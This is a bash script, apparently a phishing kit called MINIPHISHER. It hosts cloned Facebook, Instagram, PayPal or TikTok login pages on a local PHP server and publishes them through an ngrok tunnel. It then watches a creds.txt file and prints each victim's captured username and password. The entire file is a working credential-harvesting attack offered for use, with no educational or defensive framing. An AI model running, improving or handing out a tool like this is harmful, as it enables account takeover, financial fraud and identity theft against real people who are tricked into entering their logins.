#!/bin/bash

# ──[ Display Banner ]─────────────────────────────────────────────────────
clear
if command -v figlet > /dev/null 2>&1; then
    figlet -f slant "MINIPHISHER" | lolcat 2>/dev/null || figlet -f slant "MINIPHISHER"
else
    echo -e "\033[1;91m=== MINIPHISHER ===\033[0m"
fi
# ──[ Kill any leftover ngrok tunnel before starting ]─────────────────────
pkill -f "ngrok http" > /dev/null 2>&1

# ──[ Color Codes ]────────────────────────────────────────────────────────
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# ──[ Server Config ]──────────────────────────────────────────────────────
HOST="127.0.0.1"
PORT="8080"

# ──[ Function: Show Menu ]────────────────────────────────────────────────
show_menu() {
    echo -e "${GREEN}Select a phishing page to host:${NC}"
    echo "1) Facebook"
    echo "2) Instagram"
    echo "3) PayPal"
    echo "4) TikTok"
    read -p "[>] Enter your choice: " choice
    case $choice in
        1) SITE="facebook" ;;
        2) SITE="instagram" ;;
        3) SITE="paypal" ;;
        4) SITE="tiktok" ;;
        *) echo -e "${RED}[-] Invalid option!${NC}"; exit 1 ;;
    esac

    SITE_DIR="sites/$SITE"
    CREDS_FILE="$SITE_DIR/creds.txt"

    if [ ! -d "$SITE_DIR" ]; then
        echo -e "${RED}[-] Directory $SITE_DIR not found! Make sure it's set up properly.${NC}"
        exit 1
    fi

    echo -e "${CYAN}[DEBUG] Hosting site: $SITE${NC}"
    ls "$SITE_DIR"
}

# ──[ Function: Start PHP Server ]─────────────────────────────────────────
start_server() {
    echo -e "${CYAN}[+] Starting local PHP server at http://$HOST:$PORT ...${NC}"
    php -S "$HOST:$PORT" -t "$SITE_DIR" > /dev/null 2>&1 &
    SERVER_PID=$!
    sleep 2
}

# ──[ Function: Start Ngrok Tunnel ]───────────────────────────────────────
start_ngrok() {
    echo -e "${CYAN}[+] Starting Ngrok tunnel...${NC}"
    ./ngrok http "$PORT" > ngrok.log 2>&1 &
    NGROK_PID=$!
    sleep 5

    NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^"]*')
    if [ -z "$NGROK_URL" ]; then
        echo -e "${RED}[-] Ngrok failed to start. Check ngrok.log for errors.${NC}"
        kill "$SERVER_PID" 2>/dev/null
        kill "$NGROK_PID" 2>/dev/null
        exit 1
    fi

    echo -e "${GREEN}[✓] Ngrok URL: ${CYAN}$NGROK_URL${NC}"
}

# ──[ Function: Capture Credentials ]──────────────────────────────────────
show_credentials() {
    touch "$CREDS_FILE"
    echo -e "${GREEN}[+] Waiting for credentials... Press Ctrl+C to stop.${NC}"
    tail -n +1 -F "$CREDS_FILE" 2>/dev/null | while read -r line; do
        if [[ -n "$line" ]]; then
            echo -e "${CYAN}[+] New credentials captured: ${WHITE}$line${NC}"
        fi
    done
}

# ──[ Function: Cleanup ]──────────────────────────────────────────────────
cleanup() {
    echo -e "\n${RED}[*] Stopping servers and exiting...${NC}"
    kill "$SERVER_PID" > /dev/null 2>&1
    kill "$NGROK_PID" > /dev/null 2>&1
    pkill -f "ngrok http" > /dev/null 2>&1  # optional extra safety
    exit 0
}

trap cleanup SIGINT SIGTERM

# ──[ Execution Starts Here ]──────────────────────────────────────────────
show_menu
start_server
start_ngrok
show_credentials
